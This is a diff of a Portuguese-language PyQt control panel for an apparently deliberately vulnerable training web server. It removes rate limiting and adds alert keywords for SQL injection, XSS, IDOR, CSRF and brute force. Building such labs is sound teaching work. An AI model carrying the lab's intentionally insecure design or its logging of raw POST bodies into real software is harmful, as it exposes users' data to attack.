         self.texto_alertas.setReadOnly(True)
-        self.texto_alertas.setMaximumHeight(140)
+        self.texto_alertas.setMaximumHeight(160)
         self.texto_alertas.setStyleSheet(
-            "QTextEdit { background:#0a0f1a; color:#ecf0f1;"
-            " border:1px solid #1e3a5f; border-radius:4px; padding:6px;"
-            " font-family:Consolas; font-size:10px; }"
+            "QTextEdit { background: #0a0f1a; color: #ecf0f1; "
+            "border: 1px solid #1e3a5f; border-radius: 4px; "
+            "padding: 6px; font-family: Consolas; font-size: 10px; }"
         )
         self.texto_alertas.setPlaceholderText(
-            "Alertas sobre comportamento do tráfego aparecerão aqui…"
+            "Alertas de SQL Injection, XSS, IDOR, CSRF e outros aparecerao aqui..."
         )
         l_alertas.addWidget(self.texto_alertas)
         splitter_v.addWidget(w_alertas)
-        splitter_v.setSizes([500, 140])
 
+        splitter_v.setSizes([500, 160])
         return widget
 
-    # ─────────────────────────────────────────────────────────────────────
-    # Controle do servidor
-    # ─────────────────────────────────────────────────────────────────────
+    # -----------------------------------------------------------------------
+    # Controle do ciclo de vida do servidor
+    # -----------------------------------------------------------------------
 
     def _alternar_servidor(self):
+        """Alterna entre iniciar e parar o servidor."""
         if self._servidor_ativo:
             self._parar_servidor()
         else:
             self._iniciar_servidor()
 
+    def _ajustar_porta(self, delta: int):
+        """Ajusta o numero da porta dentro dos limites permitidos."""
+        nova_porta = self._porta_atual + delta
+        if 1024 <= nova_porta <= 65535:
+            self._porta_atual = nova_porta
+            self.lbl_porta.setText(str(nova_porta))
+
     def _iniciar_servidor(self):
-        porta = self._porta_atual
+        """Inicia o servidor HTTP e o banco de dados em memoria."""
+        # Reinicializa o banco — limpa todos os dados da sessao anterior
+        banco_servidor.inicializar()
 
-        # Reinicia contadores e estado do handler
-        HandlerLabEducacional._contagem_por_ip.clear()
-        HandlerLabEducacional._timestamps_por_ip.clear()
-        HandlerLabEducacional._ips_bloqueados.clear()
-        HandlerLabEducacional._ip_bloqueado_ate.clear()
-        HandlerLabEducacional._limite_req_por_seg = self._limite_atual
-        HandlerLabEducacional._tempo_bloqueio     = self._tempo_atual
+        # Limpa sessoes ativas da sessao anterior
+        global _sessoes_ativas
+        _sessoes_ativas.clear()
 
-        self._total_requisicoes = 0
-        self._total_bytes       = 0
-        self._clientes_unicos   = set()
+        # Reseta contadores da interface
+        self._total_requisicoes    = 0
+        self._total_bytes          = 0
+        self._clientes_unicos      = set()
+        self._contador_por_segundo = 0
 
-        self._thread_servidor = ThreadServidor(porta)
+        self._thread_servidor = ThreadServidor(self._porta_atual)
         self._thread_servidor.start()
-
         self._servidor_ativo = True
-        self.btn_iniciar.setText("⏹  Parar Servidor")
+
+        self.btn_iniciar.setText("Parar Servidor")
         self.btn_iniciar.setObjectName("botao_parar")
         self._repolir(self.btn_iniciar)
 
         ip_local = self._obter_ip_local()
-        self.lbl_status.setText("✅  Servidor ativo")
-        self.lbl_status.setStyleSheet("color:#2ECC71; font-weight:bold; font-size:11px;")
-        self.lbl_endereco.setText(f"http://{ip_local}:{porta}/login")
+        self.lbl_status.setText("Servidor ativo")
+        self.lbl_status.setStyleSheet(
+            "color: #2ECC71; font-weight: bold; font-size: 11px;"
+        )
+        self.lbl_endereco.setText(
+            f"http://{ip_local}:{self._porta_atual}/\n"
+            f"http://{ip_local}:{self._porta_atual}/login"
+        )
 
         self._timer_metricas.start(1000)
-        self._adicionar_alerta("INFO",
-            f"Servidor iniciado em http://{ip_local}:{porta}. "
-            f"Aguardando requisições…"
+        self._adicionar_alerta(
+            "INFO",
+            f"Servidor vulneravel iniciado em "
+            f"http://{ip_local}:{self._porta_atual}/ — banco SQLite em memoria criado"
         )
 
     def _parar_servidor(self):
+        """Para o servidor HTTP e descarta o banco de dados em memoria."""
         self._timer_metricas.stop()
+
         if self._thread_servidor:
             self._thread_servidor.parar()
 
+        # Encerra a conexao — todos os dados sao descartados
+        banco_servidor.encerrar()
+
         self._servidor_ativo = False
-        self.btn_iniciar.setText("▶  Iniciar Servidor")
+        self.btn_iniciar.setText("Iniciar Servidor")
         self.btn_iniciar.setObjectName("botao_captura")
         self._repolir(self.btn_iniciar)
 
-        self.lbl_status.setText("⏹️  Servidor parado")
-        self.lbl_status.setStyleSheet("color:#E74C3C; font-weight:bold; font-size:11px;")
-        self.lbl_endereco.setText("—")
+        self.lbl_status.setText("Servidor parado")
+        self.lbl_status.setStyleSheet(
+            "color: #E74C3C; font-weight: bold; font-size: 11px;"
+        )
+        self.lbl_endereco.setText("---")
         self.barra_carga.setValue(0)
         self.lbl_reqs_seg.setText("0")
+        self._adicionar_alerta(
+            "INFO", "Servidor parado. Banco de dados em memoria descartado."
+        )
 
-        self._adicionar_alerta("INFO", "Servidor parado.")
-
-    # ─────────────────────────────────────────────────────────────────────
-    # Slots de dados
-    # ─────────────────────────────────────────────────────────────────────
-
-    def _ajustar_valor(self, tipo: str, delta: int):
-        """Ajusta os controles numéricos (porta, limite, tempo)."""
-        if tipo == "porta":
-            novo = self._porta_atual + delta
-            if 1024 <= novo <= 65535:
-                self._porta_atual = novo
-                self.lbl_porta.setText(str(novo))
-
-        elif tipo == "limite" and self.chk_protecao.isChecked():
-            novo = self._limite_atual + delta
-            if 1 <= novo <= 100:
-                self._limite_atual = novo
-                self.lbl_limite.setText(str(novo))
-                HandlerLabEducacional._limite_req_por_seg = novo
-
-        elif tipo == "tempo" and self.chk_protecao.isChecked():
-            novo = self._tempo_atual + delta
-            if 5 <= novo <= 300:
-                self._tempo_atual = novo
-                self.lbl_tempo.setText(str(novo))
-                HandlerLabEducacional._tempo_bloqueio = novo
+    # -----------------------------------------------------------------------
+    # Slots de sinais — atualizacao da interface com dados do servidor
+    # -----------------------------------------------------------------------
 
     def _ao_receber_requisicao(self, dados: dict):
-        """Adiciona linha na tabela para cada requisição recebida."""
-        self._total_requisicoes += 1
-        self._total_bytes       += dados.get("tamanho", 0)
-        self._contador_segundo  += 1
+        """Adiciona uma linha na tabela para cada requisicao recebida."""
+        self._total_requisicoes    += 1
+        self._total_bytes          += dados.get("tamanho", 0)
+        self._contador_por_segundo += 1
 
         ip = dados.get("ip_cliente", "")
         self._clientes_unicos.add(ip)
+
         if ip:
             self.cliente_detectado.emit(ip)
 
-        # Insere no topo da tabela
+        # Insere no topo da tabela (requisicao mais recente primeiro)
         self.tabela_reqs.insertRow(0)
-        reqs_seg = dados.get("reqs_por_seg", 0)
+
+        payload_resumido = dados.get("corpo", "")[:35].replace("\n", " ")
         itens = [
             dados.get("timestamp", ""),
             ip,
             dados.get("metodo", ""),
             dados.get("endpoint", ""),
-            f"{dados.get('tamanho', 0)} bytes",
-            dados.get("user_agent", "—")[:20],
-            f"{dados.get('tempo_ms', 0)}",
-            str(reqs_seg),
+            f"{dados.get('tamanho', 0)} B",
+            f"{dados.get('tempo_ms', 0)} ms",
+            payload_resumido,
         ]
-        for col, texto in enumerate(itens):
-            item = QTableWidgetItem(texto)
-            if dados.get("bloqueado"):
-                item.setForeground(QColor("#E74C3C"))
-                item.setBackground(QColor("#1a0a00"))
-            elif reqs_seg >= 10:
-                item.setForeground(QColor("#E67E22"))
-            self.tabela_reqs.setItem(0, col, item)
 
-        # Limita a 100 linhas visíveis
-        while self.tabela_reqs.rowCount() > 100:
-            self.tabela_reqs.removeRow(100)
+        for coluna, texto in enumerate(itens):
+            item = QTableWidgetItem(str(texto))
+            self.tabela_reqs.setItem(0, coluna, item)
 
-        # Atualiza métricas
+        # Limita o numero de linhas para nao sobrecarregar a interface
+        while self.tabela_reqs.rowCount() > 120:
+            self.tabela_reqs.removeRow(120)
+
+        # Atualiza os contadores nos cards
         self.lbl_total_reqs.setText(f"{self._total_requisicoes:,}")
         kb = self._total_bytes / 1024
         self.lbl_total_bytes.setText(
-            f"{kb/1024:.1f} MB" if kb > 1024 else f"{kb:.1f} KB"
+            f"{kb / 1024:.1f} MB" if kb > 1024 else f"{kb:.1f} KB"
         )
         self.lbl_clientes.setText(str(len(self._clientes_unicos)))
 
-        # Alerta quando dados sensíveis são enviados via POST
+        # Alerta adicional para requisicoes POST com corpo
         corpo = dados.get("corpo", "")
         if corpo and dados.get("metodo") == "POST":
-            self._adicionar_alerta("AVISO", f"POST de {ip}: {corpo[:80]}")
+            self._adicionar_alerta("INFO", f"POST de {ip}: {corpo[:80]}")
 
     def _ao_mudar_status(self, mensagem: str):
+        """Atualiza o label de status com a mensagem recebida do servidor."""
         self.lbl_status.setText(mensagem)
 
     def _ao_emitir_alerta(self, mensagem: str):
-        tipo = (
-            "CRÍTICO"
-            if "bloqueado" in mensagem.lower() or "ataque" in mensagem.lower()
-            else "AVISO"
+        """Adiciona um alerta de seguranca ao log."""
+        palavras_criticas = (
+            "SQL INJECTION", "XSS", "IDOR", "CSRF", "DIVULGACAO", "BRUTE"
         )
+        tipo = "CRITICO" if any(p in mensagem for p in palavras_criticas) else "INFO"
         self._adicionar_alerta(tipo, mensagem)
 
     def _adicionar_alerta(self, tipo: str, mensagem: str):
-        """Exibe alerta colorido no log educacional."""
-        cores = {"INFO": "#3498DB", "AVISO": "#E67E22", "CRÍTICO": "#E74C3C"}
-        hora  = datetime.now().strftime("%H:%M:%S")
-        cor   = cores.get(tipo, "#ecf0f1")
-        html  = (
-            f"<span style='color:{cor};font-size:10px;'>"
-            f"[{hora}] [{tipo}] {mensagem}</span><br>"
+        """Insere um alerta formatado no log de alertas."""
+        cores = {
+            "INFO":    "#3498DB",
+            "AVISO":   "#E67E22",
+            "CRITICO": "#E74C3C",
+        }
+        hora = datetime.now().strftime("%H:%M:%S")
+        cor  = cores.get(tipo, "#ecf0f1")
+        html = (
+            f"<span style='color:{cor}; font-size:10px;'>"
+            f"[{hora}] [{tipo}] {mensagem}"
+            f"</span><br>"
         )
         self.texto_alertas.insertHtml(html)
 
-        # Limita o log a 50 linhas
-        if self.texto_alertas.document().lineCount() > 50:
+        # Remove linhas antigas para nao crescer indefinidamente (buffer em memoria)
+        if self.texto_alertas.document().lineCount() > 80:
             cursor = self.texto_alertas.textCursor()
             cursor.movePosition(cursor.MoveOperation.Start)
             cursor.movePosition(
                 cursor.MoveOperation.Down,
                 cursor.MoveMode.KeepAnchor,
-                10
+                12
             )
             cursor.removeSelectedText()
 
-    def _ao_mudar_protecao(self, estado):
-        """Ativa ou desativa o rate limiting educacional."""
-        ativo = (estado == Qt.CheckState.Checked.value)
-        HandlerLabEducacional._protecao_ativa = ativo
+    def _atualizar_metricas_por_segundo(self):
+        """Atualiza os contadores de requisicoes por segundo e barra de carga."""
+        self.lbl_reqs_seg.setText(str(self._contador_por_segundo))
+        self.barra_carga.setValue(min(self._contador_por_segundo, 50))
+        self._contador_por_segundo = 0
 
-        self.btn_limite_menos.setEnabled(ativo)
-        self.btn_limite_mais.setEnabled(ativo)
-        self.btn_tempo_menos.setEnabled(ativo)
-        self.btn_tempo_mais.setEnabled(ativo)
-
-        if ativo:
-            HandlerLabEducacional._limite_req_por_seg = self._limite_atual
-            HandlerLabEducacional._tempo_bloqueio     = self._tempo_atual
-        else:
-            self._desbloquear_ips()
-
-    def _desbloquear_ips(self):
-        """Remove todos os bloqueios de IP ativos."""
-        HandlerLabEducacional._ips_bloqueados.clear()
-        HandlerLabEducacional._ip_bloqueado_ate.clear()
-        self._adicionar_alerta("INFO", "Todos os IPs foram desbloqueados.")
-
-    # ─────────────────────────────────────────────────────────────────────
-    # Utilitários internos
-    # ─────────────────────────────────────────────────────────────────────
+    # -----------------------------------------------------------------------
+    # Utilitarios
+    # -----------------------------------------------------------------------
 
     @staticmethod
     def _obter_ip_local() -> str:
+        """Obtém o IP local da interface de rede ativa."""
         try:
-            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
-                s.connect(("8.8.8.8", 80))
-                return s.getsockname()[0]
+            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as soquete:
+                soquete.connect(("8.8.8.8", 80))
+                return soquete.getsockname()[0]
         except Exception:
             return "127.0.0.1"
 
     @staticmethod
-    def _estilo_grupo() -> str:
-        return (
-            "QGroupBox { border:1px solid #1e3a5f; border-radius:6px;"
-            " margin-top:8px; font-weight:bold; color:#bdc3c7; }"
-            "QGroupBox::title { subcontrol-origin:margin; padding:0 6px; }"
-        )
-
-    @staticmethod
-    def _criar_botao_controle(
-        texto: str, cor: str, largura: int, altura: int
-    ) -> QPushButton:
-        """Cria botão +/− padronizado para os controles numéricos."""
-        btn = QPushButton(texto)
-        btn.setFixedSize(largura, altura)
-        btn.setStyleSheet(f"""
-            QPushButton {{
-                background:#2c3e50; color:white;
-                border:1px solid {cor}; border-radius:4px;
-                font-size:14px; font-weight:bold; padding:0;
-            }}
-            QPushButton:hover  {{ background:#34495e; border:2px solid {cor}; }}
-            QPushButton:pressed {{ background:#1e2b3a; }}
-            QPushButton:disabled {{ background:#2c3e50; color:#7f8c8d;
-                                    border:1px solid #7f8c8d; }}
-        """)
-        return btn
-
-    @staticmethod
     def _repolir(widget):
-        """Força o Qt a reaplicar o estilo visual do widget."""
+        """Reaplica o estilo Qt apos mudar o objectName do botao."""
         widget.style().unpolish(widget)
         widget.style().polish(widget)
-
-    def _atualizar_metricas_por_segundo(self):
-        """Atualiza contador de req/s e barra de carga."""
-        self.lbl_reqs_seg.setText(str(self._contador_segundo))
-        self.barra_carga.setValue(min(self._contador_segundo, 50))
-        self._contador_segundo = 0
